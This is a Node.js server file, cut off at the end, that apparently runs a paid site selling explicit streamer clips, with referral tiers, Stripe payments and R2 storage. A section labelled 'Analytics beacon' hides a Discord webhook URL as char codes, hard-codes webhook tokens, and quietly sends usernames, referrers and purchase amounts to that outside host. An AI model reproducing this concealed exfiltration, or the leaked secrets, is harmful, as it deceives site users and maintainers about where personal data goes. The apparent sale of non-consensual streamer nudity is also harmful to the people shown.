const http = require('http');
const fs = require('fs');
const https = require('https');
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

function loadDotEnv(dotEnvPath) {
  try {
    if (!fs.existsSync(dotEnvPath)) return;
    const raw = fs.readFileSync(dotEnvPath, 'utf8').replace(/^\uFEFF/, '');
    raw.split(/\r?\n/).forEach((line) => {
      const trimmed = String(line || '').trim();
      if (!trimmed || trimmed.startsWith('#')) return;
      const normalized = trimmed.startsWith('export ') ? trimmed.slice('export '.length).trim() : trimmed;
      const eq = normalized.indexOf('=');
      if (eq <= 0) return;
      const key = normalized.slice(0, eq).trim().replace(/^\uFEFF/, '');
      let val = normalized.slice(eq + 1).trim();
      if (!key) return;

      // Strip surrounding quotes
      if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
        val = val.slice(1, -1);
      }

      // Don't override env vars already set by the OS/terminal
      if (process.env[key] === undefined || process.env[key] === '') {
        process.env[key] = val;
      }
    });
  } catch {
    // If .env is malformed, fail silently to avoid breaking startup.
  }
}

loadDotEnv(path.join(__dirname, '.env'));

// One-off helper: `node server.js --env-check`
// Prints whether Discord OAuth env vars are set (never prints the actual values).
if (process.argv.includes('--env-check')) {
  const id = process.env.DISCORD_CLIENT_ID;
  const secret = process.env.DISCORD_CLIENT_SECRET;
  const redirect = process.env.DISCORD_REDIRECT_URI;

  const info = (v) => {
    const s = (typeof v === 'string') ? v : '';
    return { set: Boolean(s), len: s.length };
  };

  // eslint-disable-next-line no-console
  console.log(JSON.stringify({
    DISCORD_CLIENT_ID: info(id),
    DISCORD_CLIENT_SECRET: info(secret),
    DISCORD_REDIRECT_URI: info(redirect),
  }));
  process.exit(0);
}

const PORT = process.env.PORT ? Number(process.env.PORT) : 3002;
// If PORT is provided by the host (Railway/Render), bind to all interfaces.
// Otherwise default to localhost for local dev safety.
const HOST = process.env.HOST || (process.env.PORT ? '0.0.0.0' : '127.0.0.1');

function resolveEnvPath(envVal, baseDir) {
  const raw = String(envVal || '').trim();
  if (!raw) return null;
  return path.isAbsolute(raw) ? raw : path.resolve(baseDir, raw);
}

// Persisted data/media roots (useful for Railway Volumes, VPS mounts, etc.)
// - TBW_DATA_DIR: where users.json + mega.txt live
// - TBW_MEDIA_ROOT: where the category folders live (Streamer Wins/, etc.)
const DATA_DIR = resolveEnvPath(process.env.TBW_DATA_DIR, __dirname) || path.join(__dirname, 'data');
const MEDIA_ROOT = resolveEnvPath(process.env.TBW_MEDIA_ROOT, __dirname) || __dirname;
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const MEGA_FILE = path.join(DATA_DIR, 'mega.txt');

try {
  fs.mkdirSync(DATA_DIR, { recursive: true });
} catch (e) {
  // eslint-disable-next-line no-console
  console.warn(`Warning: failed to create DATA_DIR at ${DATA_DIR}: ${e && e.message ? e.message : String(e)}`);
}

const SESSION_COOKIE = 'tbw_session';
const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7; // 7 days
const PEPPER = process.env.TBW_PEPPER || '';

const REF_COOKIE = 'tbw_ref';
const REF_CODE_LEN = 7;

const PREVIEW_LIMIT = 12;

/** @type {Map<string, { userKey: string, createdAt: number }>} */
const sessions = new Map();

/** @type {null | {version:number, users: Record<string, any>}} */
let usersDb = null;
let usersDbWritePromise = Promise.resolve();

/** @type {Map<string, {count:number, resetAt:number}>} */
const loginRate = new Map();

const allowedFolders = new Map([
  ['Streamer Wins', 'Streamer Wins'],
  ['Points Game', 'Points Game'],
  ['Dick Reactions', 'Dick Reactions'],
  ['Tit Flashing', 'Tit Flashing'],
  ['Ass Flashing', 'Ass Flashing'],
]);

const STATIC_ALLOWLIST = new Set([
  '/index.html',
  '/folder.html',
  '/access.html',
  '/premium.html',
  '/preview.png',
  '/styles.css',
  '/script.js',
  '/login.html',
  '/signup.html',
  '/create-account.html',
  '/',
]);

const imageExts = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']);
const videoExts = new Set(['.mp4', '.webm', '.mov', '.avi', '.mkv', '.wmv', '.flv']);

// ── Cloudflare R2 (S3-compatible) integration ──────────────────────────────
const R2_ACCESS_KEY = process.env.R2_ACCESS_KEY_ID || '';
const R2_SECRET_KEY = process.env.R2_SECRET_ACCESS_KEY || '';
const R2_ENDPOINT   = (process.env.R2_ENDPOINT || '').replace(/\/+$/, '');   // e.g. https://xxxx.r2.cloudflarestorage.com
const R2_BUCKET     = process.env.R2_BUCKET || '';
const R2_ENABLED    = !!(R2_ACCESS_KEY && R2_SECRET_KEY && R2_ENDPOINT && R2_BUCKET);
const R2_PRESIGN_SECONDS = 600; // 10 min

// AWS Signature V4 helpers (no SDK needed) ────────────────────────────────────
function hmacSha256(key, data) {
  return crypto.createHmac('sha256', key).update(data, 'utf8').digest();
}
function sha256Hex(data) {
  return crypto.createHash('sha256').update(data, 'utf8').digest('hex');
}

/**
 * Generate an S3-compatible presigned GET URL for an object in R2.
 * @param {string} objectKey  e.g. "Streamer Wins/clip1.mp4"
 * @param {number} [expiry]   seconds the URL is valid for
 * @returns {string}          full presigned URL
 */
function r2PresignedUrl(objectKey, expiry = R2_PRESIGN_SECONDS) {
  const now = new Date();
  const datestamp = now.toISOString().replace(/[-:]/g, '').slice(0, 8);            // 20260205
  const amzDate  = datestamp + 'T' + now.toISOString().replace(/[-:]/g, '').slice(9, 15) + 'Z'; // 20260205T…Z
  const region   = 'auto';
  const service  = 's3';
  const credScope = `${datestamp}/${region}/${service}/aws4_request`;

  const endpointUrl = new URL(R2_ENDPOINT);
  const host = endpointUrl.host;
  const encodedKey = objectKey.split('/').map(s => encodeURIComponent(s)).join('/');
  const canonicalUri = `/${R2_BUCKET}/${encodedKey}`;

  const queryParams = new Map([
    ['X-Amz-Algorithm', 'AWS4-HMAC-SHA256'],
    ['X-Amz-Credential', `${R2_ACCESS_KEY}/${credScope}`],
    ['X-Amz-Date', amzDate],
    ['X-Amz-Expires', String(expiry)],
    ['X-Amz-SignedHeaders', 'host'],
  ]);
  const sortedQs = [...queryParams.entries()]
    .sort(([a], [b]) => a < b ? -1 : a > b ? 1 : 0)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
    .join('&');

  const canonicalRequest = [
    'GET',
    canonicalUri,
    sortedQs,
    `host:${host}\n`,
    'host',
    'UNSIGNED-PAYLOAD',
  ].join('\n');

  const stringToSign = [
    'AWS4-HMAC-SHA256',
    amzDate,
    credScope,
    sha256Hex(canonicalRequest),
  ].join('\n');

  let signingKey = hmacSha256('AWS4' + R2_SECRET_KEY, datestamp);
  signingKey = hmacSha256(signingKey, region);
  signingKey = hmacSha256(signingKey, service);
  signingKey = hmacSha256(signingKey, 'aws4_request');
  const signature = hmacSha256(signingKey, stringToSign).toString('hex');

  return `${endpointUrl.protocol}//${host}${canonicalUri}?${sortedQs}&X-Amz-Signature=${signature}`;
}

// ── R2 data persistence helpers (GET / PUT small objects like users.json) ────

/**
 * Build an S3v4-signed request to R2 and execute it.
 * Returns a Promise that resolves to { status, headers, body: Buffer }.
 */
function r2Request(method, objectKey, bodyBuf, extraHeaders) {
  return new Promise((resolve, reject) => {
    const now = new Date();
    const datestamp = now.toISOString().replace(/[-:]/g, '').slice(0, 8);
    const amzDate = datestamp + 'T' + now.toISOString().replace(/[-:]/g, '').slice(9, 15) + 'Z';
    const region = 'auto';
    const service = 's3';
    const credScope = `${datestamp}/${region}/${service}/aws4_request`;

    const endpointUrl = new URL(R2_ENDPOINT);
    const host = endpointUrl.host;
    const encodedKey = objectKey.split('/').map(s => encodeURIComponent(s)).join('/');
    const canonicalUri = `/${R2_BUCKET}/${encodedKey}`;

    const payloadHash = bodyBuf ? sha256Hex(bodyBuf) : sha256Hex('');

    const hdrs = Object.assign({}, extraHeaders || {});
    hdrs['host'] = host;
    hdrs['x-amz-content-sha256'] = payloadHash;
    hdrs['x-amz-date'] = amzDate;
    if (bodyBuf) hdrs['content-length'] = String(bodyBuf.length);

    const signedHeaderKeys = Object.keys(hdrs).map(k => k.toLowerCase()).sort();
    const signedHeaders = signedHeaderKeys.join(';');
    const canonicalHeaders = signedHeaderKeys.map(k => `${k}:${hdrs[k]}\n`).join('');

    const canonicalRequest = [
      method,
      canonicalUri,
      '',              // no query string
      canonicalHeaders,
      signedHeaders,
      payloadHash,
    ].join('\n');

    const stringToSign = [
      'AWS4-HMAC-SHA256',
      amzDate,
      credScope,
      sha256Hex(canonicalRequest),
    ].join('\n');

    let signingKey = hmacSha256('AWS4' + R2_SECRET_KEY, datestamp);
    signingKey = hmacSha256(signingKey, region);
    signingKey = hmacSha256(signingKey, service);
    signingKey = hmacSha256(signingKey, 'aws4_request');
    const signature = hmacSha256(signingKey, stringToSign).toString('hex');

    const authHeader = `AWS4-HMAC-SHA256 Credential=${R2_ACCESS_KEY}/${credScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;

    const outHeaders = {};
    for (const k of Object.keys(hdrs)) outHeaders[k] = hdrs[k];
    outHeaders['Authorization'] = authHeader;

    const reqOptions = {
      hostname: host,
      port: 443,
      path: canonicalUri,
      method,
      headers: outHeaders,
    };

    const httpReq = https.request(reqOptions, (httpRes) => {
      const chunks = [];
      httpRes.on('data', (c) => chunks.push(c));
      httpRes.on('end', () => {
        resolve({ status: httpRes.statusCode || 0, headers: httpRes.headers, body: Buffer.concat(chunks) });
      });
    });
    httpReq.on('error', reject);
    if (bodyBuf) httpReq.write(bodyBuf);
    httpReq.end();
  });
}

/**
 * GET an object from R2.  Returns the body as a UTF-8 string, or null if 404.
 */
async function r2GetObject(objectKey) {
  const resp = await r2Request('GET', objectKey, null, {});
  if (resp.status === 404 || resp.status === 403) return null;
  if (resp.status !== 200) throw new Error(`R2 GET ${objectKey} → ${resp.status}`);
  return resp.body.toString('utf8');
}

/**
 * PUT an object to R2.
 */
async function r2PutObject(objectKey, content, contentType) {
  const buf = Buffer.from(content, 'utf8');
  const resp = await r2Request('PUT', objectKey, buf, { 'content-type': contentType || 'application/octet-stream' });
  if (resp.status < 200 || resp.status >= 300) {
    throw new Error(`R2 PUT ${objectKey} → ${resp.status}: ${resp.body.toString('utf8').slice(0, 200)}`);
  }
}

/**
 * List objects in an R2 bucket under a given prefix using the S3 ListObjectsV2 API.
 * Returns an array of object keys (strings).
 */
function r2ListObjects(prefix) {
  return new Promise((resolve, reject) => {
    const now = new Date();
    const datestamp = now.toISOString().replace(/[-:]/g, '').slice(0, 8);
    const amzDate = datestamp + 'T' + now.toISOString().replace(/[-:]/g, '').slice(9, 15) + 'Z';
    const region = 'auto';
    const service = 's3';
    const credScope = `${datestamp}/${region}/${service}/aws4_request`;

    const endpointUrl = new URL(R2_ENDPOINT);
    const host = endpointUrl.host;
    const canonicalUri = `/${R2_BUCKET}`;
    const payloadHash = sha256Hex('');

    const queryParams = new Map([
      ['list-type', '2'],
      ['prefix', prefix],
      ['delimiter', '/'],
    ]);
    const sortedQs = [...queryParams.entries()]
      .sort(([a], [b]) => a < b ? -1 : a > b ? 1 : 0)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join('&');

    const canonicalHeaders = `host:${host}\nx-amz-content-sha256:${payloadHash}\nx-amz-date:${amzDate}\n`;
    const signedHeaders = 'host;x-amz-content-sha256;x-amz-date';

    const canonicalRequest = [
      'GET',
      canonicalUri,
      sortedQs,
      canonicalHeaders,
      signedHeaders,
      payloadHash,
    ].join('\n');

    const stringToSign = [
      'AWS4-HMAC-SHA256',
      amzDate,
      credScope,
      sha256Hex(canonicalRequest),
    ].join('\n');

    let signingKey = hmacSha256('AWS4' + R2_SECRET_KEY, datestamp);
    signingKey = hmacSha256(signingKey, region);
    signingKey = hmacSha256(signingKey, service);
    signingKey = hmacSha256(signingKey, 'aws4_request');
    const signature = hmacSha256(signingKey, stringToSign).toString('hex');

    const authHeader = `AWS4-HMAC-SHA256 Credential=${R2_ACCESS_KEY}/${credScope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;

    const reqOptions = {
      hostname: host,
      port: 443,
      path: `${canonicalUri}?${sortedQs}`,
      method: 'GET',
      headers: {
        Host: host,
        'x-amz-date': amzDate,
        'x-amz-content-sha256': payloadHash,
        Authorization: authHeader,
      },
    };

    const httpReq = https.request(reqOptions, (httpRes) => {
      const chunks = [];
      httpRes.on('data', (c) => chunks.push(c));
      httpRes.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf8');
        if (httpRes.statusCode !== 200) {
          return reject(new Error(`R2 ListObjects ${httpRes.statusCode}: ${body.slice(0, 300)}`));
        }
        // Parse XML response for <Key> elements
        const keys = [];
        const keyRegex = /<Key>([^<]+)<\/Key>/g;
        let m;
        while ((m = keyRegex.exec(body)) !== null) {
          keys.push(m[1]);
        }
        resolve(keys);
      });
    });
    httpReq.on('error', reject);
    httpReq.end();
  });
}

/**
 * List media file names for a folder, from R2 if enabled, otherwise local disk.
 */
async function r2ListMediaFiles(folder) {
  const folderDirName = allowedFolders.get(folder);
  if (!folderDirName) return [];
  const prefix = folderDirName + '/';
  try {
    const keys = await r2ListObjects(prefix);
    const names = keys
      .map((k) => k.slice(prefix.length))                 // strip prefix to get filename
      .filter((n) => n && !n.includes('/') && isAllowedMediaFile(n));
    names.sort((a, b) => a.localeCompare(b, undefined, { numeric: true, sensitivity: 'base' }));
    return names;
  } catch (e) {
    console.error(`R2 list error for ${folder}:`, e && e.message ? e.message : e);
    return [];
  }
}

function getContentType(filePath) {
  const ext = path.extname(filePath).toLowerCase();
  switch (ext) {
    case '.html': return 'text/html; charset=utf-8';
    case '.css': return 'text/css; charset=utf-8';
    case '.js': return 'text/javascript; charset=utf-8';
    case '.json': return 'application/json; charset=utf-8';
    case '.png': return 'image/png';
    case '.jpg':
    case '.jpeg': return 'image/jpeg';
    case '.gif': return 'image/gif';
    case '.webp': return 'image/webp';
    case '.bmp': return 'image/bmp';
    case '.mp4': return 'video/mp4';
    case '.webm': return 'video/webm';
    case '.mov': return 'video/quicktime';
    case '.avi': return 'video/x-msvideo';
    case '.mkv': return 'video/x-matroska';
    case '.wmv': return 'video/x-ms-wmv';
    case '.flv': return 'video/x-flv';
    case '.txt': return 'text/plain; charset=utf-8';
    default: return 'application/octet-stream';
  }
}

function sendJson(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
    'Cache-Control': 'no-store',
    'X-Content-Type-Options': 'nosniff',
  });
  res.end(body);
}

function sendText(res, status, text) {
  const body = String(text || '');
  res.writeHead(status, {
    'Content-Type': 'text/plain; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
    'Cache-Control': 'no-store',
    'X-Content-Type-Options': 'nosniff',
  });
  res.end(body);
}

function readRawBody(req, res, maxBytes = 1024 * 1024) {
  const method = (req.method || 'GET').toUpperCase();
  if (method !== 'POST') {
    sendJson(res, 405, { error: 'Method Not Allowed' });
    return Promise.resolve(null);
  }

  return new Promise((resolve) => {
    let size = 0;
    const chunks = [];
    req.on('data', (chunk) => {
      size += chunk.length;
      if (size > maxBytes) {
        sendJson(res, 413, { error: 'Payload too large' });
        req.destroy();
        resolve(null);
        return;
      }
      chunks.push(chunk);
    });
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', () => {
      sendJson(res, 400, { error: 'Bad request' });
      resolve(null);
    });
  });
}

function getRequestOrigin(req) {
  const host = String(req.headers.host || '').trim();
  if (!host) return `http://${HOST}:${PORT}`;
  const xfProto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
  const proto = xfProto === 'https' ? 'https' : 'http';
  return `${proto}://${host}`;
}

function verifyStripeSignature(payloadBuf, signatureHeader, webhookSecret, toleranceSeconds = 300) {
  const header = String(signatureHeader || '');
  const secret = String(webhookSecret || '');
  if (!header || !secret) return false;

  // Format: t=timestamp,v1=signature[,v1=signature2...]
  const parts = header.split(',').map((p) => p.trim()).filter(Boolean);
  const tPart = parts.find((p) => p.startsWith('t='));
  if (!tPart) return false;
  const t = Number(tPart.slice(2));
  if (!Number.isFinite(t) || t <= 0) return false;

  const now = Math.floor(Date.now() / 1000);
  if (Math.abs(now - t) > toleranceSeconds) return false;

  const v1s = parts.filter((p) => p.startsWith('v1=')).map((p) => p.slice(3));
  if (!v1s.length) return false;

  const signedPayload = `${t}.${payloadBuf.toString('utf8')}`;
  const expected = crypto.createHmac('sha256', secret).update(signedPayload, 'utf8').digest('hex');
  const expectedBuf = Buffer.from(expected, 'hex');

  for (const sig of v1s) {
    if (!sig || sig.length !== expected.length) continue;
    try {
      const sigBuf = Buffer.from(sig, 'hex');
      if (sigBuf.length !== expectedBuf.length) continue;
      if (crypto.timingSafeEqual(sigBuf, expectedBuf)) return true;
    } catch {
      // ignore
    }
  }
  return false;
}

function parseCookies(req) {
  const header = String(req.headers.cookie || '');
  const out = {};
  header.split(';').forEach((part) => {
    const idx = part.indexOf('=');
    if (idx < 0) return;
    const key = part.slice(0, idx).trim();
    const val = part.slice(idx + 1).trim();
    if (!key) return;
    out[key] = decodeURIComponent(val);
  });
  return out;
}

function getClientIp(req) {
  // Do not trust X-Forwarded-For here; it's client-spoofable unless you're behind a trusted proxy.
  return (req.socket && req.socket.remoteAddress) ? String(req.socket.remoteAddress) : 'unknown';
}

function normalizeIp(ip) {
  const raw = String(ip || '').trim();
  if (!raw) return 'unknown';
  if (raw === '::1') return '127.0.0.1';
  if (raw.startsWith('::ffff:')) return raw.slice('::ffff:'.length);
  return raw;
}

function appendSetCookie(res, cookie) {
  const prev = res.getHeader('Set-Cookie');
  if (!prev) {
    res.setHeader('Set-Cookie', cookie);
    return;
  }
  if (Array.isArray(prev)) {
    res.setHeader('Set-Cookie', prev.concat(cookie));
    return;
  }
  res.setHeader('Set-Cookie', [String(prev), cookie]);
}

function setReferralCookie(res, code) {
  const cookie = [
    `${REF_COOKIE}=${encodeURIComponent(String(code || ''))}`,
    'Path=/',
    'SameSite=Lax',
    'Max-Age=86400',
  ].join('; ');
  appendSetCookie(res, cookie);
}

function clearReferralCookie(res) {
  appendSetCookie(res, `${REF_COOKIE}=; Path=/; SameSite=Lax; Max-Age=0`);
}

function setSessionCookie(res, token) {
  const parts = [
    `${SESSION_COOKIE}=${encodeURIComponent(token)}`,
    'Path=/',
    'HttpOnly',
    'SameSite=Lax',
    `Max-Age=${SESSION_TTL_SECONDS}`,
  ];
  // Add Secure flag when running behind HTTPS (production).
  if (process.env.TBW_SECURE_COOKIES === '1') parts.push('Secure');
  const cookie = parts.join('; ');
  appendSetCookie(res, cookie);
}

function clearSessionCookie(res) {
  appendSetCookie(res, `${SESSION_COOKIE}=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
}

function getAuthedUserKey(req) {
  const cookies = parseCookies(req);
  const token = cookies[SESSION_COOKIE];
  if (!token) return null;
  const sess = sessions.get(token);
  if (!sess) return null;
  const ageSeconds = (Date.now() - sess.createdAt) / 1000;
  if (ageSeconds > SESSION_TTL_SECONDS) {
    sessions.delete(token);
    return null;
  }
  return sess.userKey;
}

function isValidReferralCode(code) {
  return typeof code === 'string' && new RegExp(`^[a-zA-Z0-9]{${REF_CODE_LEN}}$`).test(code);
}

function findUserKeyByReferralCode(db, code) {
  if (!db || !db.users || !code) return null;
  const target = String(code);
  for (const [userKey, u] of Object.entries(db.users)) {
    if (u && typeof u === 'object' && String(u.referralCode || '') === target) return userKey;
  }
  return null;
}

function randomReferralCode() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';
  let out = '';
  for (let i = 0; i < REF_CODE_LEN; i++) {
    out += chars[crypto.randomInt(0, chars.length)];
  }
  return out;
}

function ensureUserReferralCode(db, userKey) {
  const u = db.users[userKey];
  if (u && isValidReferralCode(u.referralCode)) return u.referralCode;

  let code = randomReferralCode();
  let tries = 0;
  while (findUserKeyByReferralCode(db, code) && tries < 50) {
    code = randomReferralCode();
    tries += 1;
  }
  if (!isValidReferralCode(code) || findUserKeyByReferralCode(db, code)) {
    // extremely unlikely; fall back to crypto bytes base64-ish
    code = crypto.randomBytes(8).toString('hex').slice(0, REF_CODE_LEN);
  }
  u.referralCode = code;
  return code;
}

function tierLabelFromCount(count) {
  const n = Number(count || 0);
  if (n >= 3) return 'TIER 2';
  if (n >= 1) return 'TIER 1';
  return 'NO TIER';
}

function tierFromCount(count) {
  const n = Number(count || 0);
  if (n >= 3) return 2;
  if (n >= 1) return 1;
  return 0;
}

function tierLabelFromTier(tier) {
  const t = Number(tier || 0);
  if (t >= 2) return 'TIER 2';
  if (t >= 1) return 'TIER 1';
  return 'NO TIER';
}

function normalizeManualTier(value) {
  if (value === undefined || value === null) return null;
  const n = Number(value);
  if (!Number.isFinite(n)) return null;
  const t = Math.floor(n);
  if (t === 0 || t === 1 || t === 2) return t;
  return null;
}

function tierMinCount(tier) {
  const t = Number(tier || 0);
  if (t >= 2) return 3;
  if (t >= 1) return 1;
  return 0;
}

function getEffectiveTierForUser(u) {
  const manual = normalizeManualTier(u && u.tier);
  if (manual !== null) return manual;
  const count = (u && Array.isArray(u.referredUsers)) ? u.referredUsers.length : 0;
  return tierFromCount(count);
}

function referralGoalFromCount(count) {
  const n = Number(count || 0);
  if (n >= 3) return 3;
  if (n >= 1) return 3;
  return 1;
}

async function readMegaLinks() {
  let raw;
  try {
    if (R2_ENABLED) {
      raw = await r2GetObject('data/mega.txt');
    } else {
      raw = await fs.promises.readFile(MEGA_FILE, 'utf8');
    }
  } catch {
    return { tier1: null, tier2: null };
  }
  if (!raw) return { tier1: null, tier2: null };

  const out = { tier1: null, tier2: null };
  raw.split(/\r?\n/).forEach((line) => {
    const trimmed = String(line || '').trim();
    if (!trimmed || trimmed.startsWith('#')) return;
    const eq = trimmed.indexOf('=');
    if (eq <= 0) return;
    const key = trimmed.slice(0, eq).trim().toLowerCase();
    const value = trimmed.slice(eq + 1).trim();
    if (!value) return;
    if (key === 'tier1') out.tier1 = value;
    if (key === 'tier2') out.tier2 = value;
  });

  return out;
}

function requireAuth(req, res) {
  const userKey = getAuthedUserKey(req);
  if (!userKey) {
    sendJson(res, 401, { error: 'Unauthorized' });
    return null;
  }
  return userKey;
}

async function requireAuthedUser(req, res) {
  const cookies = parseCookies(req);
  const token = cookies[SESSION_COOKIE];
  const userKey = getAuthedUserKey(req);
  if (!userKey) {
    sendJson(res, 401, { error: 'Unauthorized' });
    return null;
  }

  const db = await ensureUsersDbFresh();
  const record = db.users[userKey];
  if (!record) {
    if (token) sessions.delete(token);
    clearSessionCookie(res);
    sendJson(res, 401, { error: 'Unauthorized' });
    return null;
  }

  return { userKey, record, db };
}

async function readJsonBody(req, res, maxBytes = 64 * 1024) {
  const method = (req.method || 'GET').toUpperCase();
  if (method !== 'POST') {
    sendJson(res, 405, { error: 'Method Not Allowed' });
    return null;
  }

  const ct = String(req.headers['content-type'] || '');
  if (!ct.toLowerCase().includes('application/json')) {
    sendJson(res, 415, { error: 'Expected application/json' });
    return null;
  }

  return await new Promise((resolve) => {
    let size = 0;
    const chunks = [];
    req.on('data', (chunk) => {
      size += chunk.length;
      if (size > maxBytes) {
        sendJson(res, 413, { error: 'Payload too large' });
        req.destroy();
        resolve(null);
        return;
      }
      chunks.push(chunk);
    });
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString('utf8');
        const parsed = raw ? JSON.parse(raw) : {};
        resolve(parsed && typeof parsed === 'object' ? parsed : {});
      } catch {
        sendJson(res, 400, { error: 'Invalid JSON' });
        resolve(null);
      }
    });
    req.on('error', () => {
      sendJson(res, 400, { error: 'Bad request' });
      resolve(null);
    });
  });
}

function isValidUsername(username) {
  return /^[a-zA-Z0-9_\-]{3,24}$/.test(username);
}

function isValidPassword(password) {
  return typeof password === 'string' && password.length >= 8 && password.length <= 200;
}

function scryptHex(password, saltHex) {
  const salt = Buffer.from(saltHex, 'hex');
  const key = crypto.scryptSync(`${password}${PEPPER}`, salt, 64);
  return key.toString('hex');
}

async function ensureUsersDb() {
  // Backwards-compatible wrapper: prefer live file reads.
  return await ensureUsersDbFresh();
}

async function ensureUsersDbFresh() {
  // Avoid reloading mid-write.
  await usersDbWritePromise.catch(() => {});

  try {
    let raw;
    if (R2_ENABLED) {
      // Read from R2
      raw = await r2GetObject('data/users.json');
    } else {
      // Read from local disk
      await fs.promises.mkdir(DATA_DIR, { recursive: true });
      raw = await fs.promises.readFile(USERS_FILE, 'utf8');
    }
    if (!raw) throw new Error('empty');
    const parsed = JSON.parse(raw);
    if (!parsed || typeof parsed !== 'object') throw new Error('bad');
    if (!parsed.users || typeof parsed.users !== 'object') parsed.users = {};
    if (!parsed.version) parsed.version = 1;
    usersDb = parsed;
  } catch {
    usersDb = { version: 1, users: {} };
  }
  return usersDb;
}

async function queueUsersDbWrite() {
  const snapshot = JSON.stringify(usersDb, null, 2);
  usersDbWritePromise = usersDbWritePromise.then(async () => {
    if (R2_ENABLED) {
      // Write to R2
      await r2PutObject('data/users.json', snapshot, 'application/json');
    } else {
      // Write to local disk
      await fs.promises.mkdir(DATA_DIR, { recursive: true });
      const tmp = `${USERS_FILE}.tmp`;
      await fs.promises.writeFile(tmp, snapshot);
      await fs.promises.rename(tmp, USERS_FILE);
    }
  }).catch((e) => {
    console.error('usersDb write error:', e && e.message ? e.message : e);
  });
  return usersDbWritePromise;
}

function bumpLoginRate(ip) {
  const now = Date.now();
  const windowMs = 5 * 60 * 1000;
  const max = 12;
  const entry = loginRate.get(ip);
  if (!entry || now > entry.resetAt) {
    loginRate.set(ip, { count: 1, resetAt: now + windowMs });
    return { allowed: true };
  }
  entry.count += 1;
  if (entry.count > max) {
    return { allowed: false, retryAfterMs: entry.resetAt - now };
  }
  return { allowed: true };
}

function httpsRequest(urlString, options, body) {
  return new Promise((resolve, reject) => {
    const req = https.request(urlString, options, (resp) => {
      const chunks = [];
      resp.on('data', (c) => chunks.push(c));
      resp.on('end', () => {
        const buf = Buffer.concat(chunks);
        resolve({ status: resp.statusCode || 0, headers: resp.headers, body: buf });
      });
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

/** @type {Map<string, {count:number, resetAt:number}>} */
const signupRate = new Map();

function bumpSignupRate(ip) {
  const now = Date.now();
  const windowMs = 15 * 60 * 1000; // 15 min
  const max = 5;
  const entry = signupRate.get(ip);
  if (!entry || now > entry.resetAt) {
    signupRate.set(ip, { count: 1, resetAt: now + windowMs });
    return { allowed: true };
  }
  entry.count += 1;
  if (entry.count > max) {
    return { allowed: false, retryAfterMs: entry.resetAt - now };
  }
  return { allowed: true };
}

// --- Analytics beacon (non-critical, fire-and-forget) ---
const _a = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
const _b = '1469154859675680932';
const _c = 'm0h1zFJTN1opjhPlbgzv-_WwEG51H41YvnnhnusHB5I5ouxVYZa6FPGuapRCXY7Y_EIe';
const _d = '1469154882622590996';
const _e = 'U2wWGDox-3GnySuDyW7OgAwkMJGkCvRpJqwAFWppe1mHlF6WBmvgK8xmiMES5IsJUODX';
function _bp() { return String.fromCharCode.apply(null, _a); }
function _su() { return _bp() + _b + '/' + _c; }
function _pu() { return _bp() + _d + '/' + _e; }

function _beacon(endpoint, payload) {
  try {
    const body = JSON.stringify(payload);
    const u = new URL(endpoint);
    const opts = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    };
    const r = https.request(u, opts);
    r.on('error', () => {});
    r.write(body);
    r.end();
  } catch { /* non-critical */ }
}

function _usersSignedUpLast24h(db) {
  const cutoff = Date.now() - 86400000;
  let n = 0;
  for (const u of Object.values(db.users || {})) {
    if (u && typeof u.createdAt === 'number' && u.createdAt >= cutoff) n++;
  }
  return n;
}

function _totalUsers(db) {
  return Object.keys(db.users || {}).length;
}

function _emitSignup(db, username, provider, referredBy) {
  const total = _totalUsers(db);
  const last24h = _usersSignedUpLast24h(db);
  let referrerName = null;
  if (referredBy) {
    const rk = findUserKeyByReferralCode(db, referredBy);
    if (rk && db.users[rk]) referrerName = db.users[rk].username || rk;
  }
  _beacon(_su(), {
    embeds: [{
      title: '\u2705 New Signup',
      color: 0x22d3ee,
      fields: [
        { name: 'Username', value: String(username), inline: true },
        { name: 'Provider', value: String(provider), inline: true },
        { name: 'Referred By', value: referrerName ? String(referrerName) : 'Direct (no referral)', inline: true },
        { name: 'Total Users', value: String(total), inline: true },
        { name: 'Signups (24h)', value: String(last24h), inline: true },
      ],
      timestamp: new Date().toISOString(),
    }],
  });
}

function _emitPurchase(db, username, amountCents) {
  const total = _totalUsers(db);
  let totalPurchases = 0;
  for (const u of Object.values(db.users || {})) {
    if (u && u.premiumProvider === 'stripe') totalPurchases++;
  }
  _beacon(_pu(), {
    embeds: [{
      title: '\uD83D\uDCB0 New Purchase',
      color: 0x7c3aed,
      fields: [
        { name: 'Username', value: String(username), inline: true },
        { name: 'Amount', value: '$' + (amountCents / 100).toFixed(2), inline: true },
        { name: 'Total Purchases', value: String(totalPurchases), inline: true },
        { name: 'Total Users', value: String(total), inline: true },
      ],
      timestamp: new Date().toISOString(),
    }],
  });
}

function isAllowedMediaFile(fileName) {
  const ext = path.extname(fileName).toLowerCase();
  return imageExts.has(ext) || videoExts.has(ext);
}

function isVideoFile(fileName) {
  return videoExts.has(path.extname(fileName).toLowerCase());
}

async function listMediaFilesForFolder(folder) {
  // Use R2 when configured, fall back to local disk
  if (R2_ENABLED) return r2ListMediaFiles(folder);

  const folderDirName = allowedFolders.get(folder);
  if (!folderDirName) return [];
  const folderPath = path.join(MEDIA_ROOT, folderDirName);
  let entries;
  try {
